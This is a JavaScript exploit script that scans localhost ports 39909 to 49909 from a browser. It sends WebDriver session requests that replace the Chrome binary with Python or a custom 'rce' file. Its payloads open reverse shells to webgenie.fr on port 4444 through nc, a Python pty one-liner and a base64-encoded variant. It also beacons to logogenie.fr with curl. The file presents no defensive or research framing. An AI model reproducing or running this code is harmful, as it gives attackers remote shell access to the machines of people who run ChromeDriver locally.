async function postToPort(port) {
    var url = `http://127.0.0.1:${port}/session`;
    var options = {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            capabilities: {
                alwaysMatch: {
                    browserName: "chrome",
                    "goog:chromeOptions": {
                        binary: "/media/sf_share/tog/RCE_chrome/rce",
                        args: "/tmp/skav"
                    }
                }
            }
        })
    };
/*
    var options = {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            "capabilities": {
                "alwaysMatch": {
                    "browserName" :"chrome",
                    "goog:chromeOptions": {
                        "binary": "/usr/bin/google-chrome",
                        "args": [
                            "--app=https://www.logogenie.fr",
                            "--disable-web-security"
                        ],
                    }
                }
            }
        })
    }
	python -c "import os;import base64;os.system(base64.decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigid2ViZ2VuaWUuZnIiKSxpbnQob3MuZ2V0ZW52KCI0NDQ0IikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw=='))"
	

*/
    var options = {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
            "capabilities": {
                "alwaysMatch": {
                    "browserName": "chrome",
                    "goog:chromeOptions":
                     {
                        "binary": "/usr/bin/python",
						 "args": ["-cimport os;os.system('/usr/bin/nc webgenie.fr 4444 -e /bin/bash')"]
                     }
                }
            }
        })
    }
	
	
	var options = {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
            "capabilities": {
                "alwaysMatch": {
                    "browserName": "chrome",
                    "goog:chromeOptions":
                     {
                        "binary": "/usr/bin/python",
						 "args": ["-cimport os;os.system('/usr/bin/curl https://www.logogenie.fr/?bot=GGskav')"]
                     }
                }
            }
        })
    }
	
	var options = {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
            "capabilities": {
                "alwaysMatch": {
                    "browserName": "chrome",
                    "goog:chromeOptions":
                     {
                        "binary": "/usr/bin/python",
						 "args": ["-ca=__import__;s=a('socket');o=a('os').dup2;p=a('pty').spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(('webgenie.fr',4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p('/bin/sh')"]
                     }
                }
            }
        })
    }
	

    try
    {
		/*var options = {
			method: "GET",
			mode: "no-cors"
		}
		var url = `http://127.0.0.1:${port}/sessions`;*/
		response = fetch(url, options);
		
		/*console.log(`Port ${port}: Request sent`, response.status);
		if(response.status == 0){
			var u = `https://www.logogenie.fr/?bot=${port}&data=` + response.status
			await fetch(u, { method: "GET", mode: "no-cors" });
		}*/
	}
	catch (error) {
		console.error(`Port ${port}: Error - ${error.message}`);
	}
}

async function postToAllPorts() {
    const startPort = 39909;
    const endPort   = 49909;
    const promises  = [];

    for (let port = startPort; port <= endPort; port++) {
        promises.push(postToPort(port));
    }

    await Promise.all(promises);
    console.log("All requests have been sent.");
}

postToAllPorts();
